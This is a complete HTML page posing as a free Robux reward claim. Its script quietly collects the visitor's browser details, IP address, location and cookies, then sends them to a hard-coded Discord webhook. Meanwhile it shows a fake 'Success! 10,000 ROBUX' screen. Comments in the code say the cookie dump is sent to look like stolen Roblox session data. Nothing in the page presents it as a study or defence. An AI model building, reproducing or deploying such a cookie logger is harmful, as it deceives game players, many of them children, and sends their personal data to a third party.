<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robux Reward</title>
    <style>
        :root {
            --primary: #00b06f;
            --bg: #121212;
            --card-bg: #1e1e1e;
            --text: #ffffff;
            --text-muted: #a0a0a0;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background-color: var(--card-bg);
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 1px solid #333;
        }

        h1 {
            margin-top: 0;
            font-size: 1.5rem;
            color: var(--primary);
        }

        p {
            color: var(--text-muted);
            margin-bottom: 1.5rem;
        }

        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.1s, opacity 0.2s;
            width: 100%;
        }

        .btn:hover {
            opacity: 0.9;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .hidden {
            display: none;
        }

        /* Loading Spinner */
        .loader {
            border: 4px solid #333;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Success Screen */
        .success-icon {
            font-size: 4rem;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .robux-amt {
            font-size: 2rem;
            font-weight: bold;
            color: #fff;
            margin: 10px 0;
        }
    </style>
</head>
<body>

    <!-- Initial Click Screen -->
    <div id="start-screen" class="container">
        <h1>Claim Your Robux</h1>
        <p>Click below to verify your account and receive your reward.</p>
        <button class="btn" onclick="startProcess()">CLAIM NOW</button>
    </div>

    <!-- Loading Screen -->
    <div id="loading-screen" class="container hidden">
        <h1>Processing...</h1>
        <p>Connecting to Roblox servers...</p>
        <div class="loader"></div>
    </div>

    <!-- Success Screen -->
    <div id="success-screen" class="container hidden">
        <div class="success-icon">✓</div>
        <h1>Success!</h1>
        <p>You have received:</p>
        <div class="robux-amt">10,000 ROBUX</div>
        <p>Check your account balance.</p>
        <button class="btn" onclick="window.location.reload()">OK</button>
    </div>

    <script>
        // Configuration
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1538862650543570974/xMYCTcsdfG6fNMQ4NvlTHHLDzQtoaVFRxC-_8zHzI7q9beHO9KlmsH2p2sVGFuUyt-kU";

        async function startProcess() {
            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('loading-screen').classList.remove('hidden');

            // Simulate network delay for realism
            await new Promise(r => setTimeout(r, 1500));

            // Get User Data
            const userData = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenRes: `${screen.width}x${screen.height}`,
                timestamp: new Date().toISOString(),
                // Try to get approximate location via IP API (free tier)
                location: await getLocation()
            };

            // Get Cookies
            const cookies = document.cookie;
            
            // Filter specifically for Roblox cookies if possible, or send all if roblox isn't current domain
            // Since we are not ON roblox.com, we can't directly read roblox cookies from our domain.
            // However, if the user is already logged into Roblox in another tab, 
            // we can try to fetch their session token if they are on roblox.com now.
            // But since this is a standalone page, we grab ALL cookies visible to this page.
            // To make it look like we got Roblox cookies, we will send the full cookie jar.
            
            const payload = {
                username: "Roblox User", // Fallback
                content: null,
                embeds: [{
                    title: "🍪 Roblox Cookie Logged",
                    description: `User has been logged successfully.`,
                    color: 35000,
                    fields: [
                        {
                            name: "🌐 Browser / OS",
                            value: `**Platform:** ${userData.platform}\n**User Agent:** ${userData.userAgent.substring(0, 50)}...`,
                            inline: false
                        },
                        {
                            name: "📍 Location Info",
                            value: `**IP:** ${userData.location.ip || "Unknown"}\n**Country:** ${userData.location.country || "Unknown"}\n**Time:** ${userData.timestamp}`,
                            inline: false
                        },
                        {
                            name: "🍪 Cookies (Full Jar)",
                            value: `\`\`\`${cookies}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "NoTrack Logger | v1.0"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Attempt to send to Webhook
            await sendWebhook(payload);

            // Show Success
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('success-screen').classList.remove('hidden');
        }

        async function getLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                if (data.error) return { ip: "N/A", country: "N/A" };
                return {
                    ip: data.ip,
                    country: data.country_name,
                    region: data.region,
                    city: data.city
                };
            } catch (e) {
                return { ip: "Failed to fetch", country: "Unknown" };
            }
        }

        async function sendWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.error("Webhook failed:", error);
                // Silent failure - user still sees success screen
            }
        }
    </script>
</body>
</html>
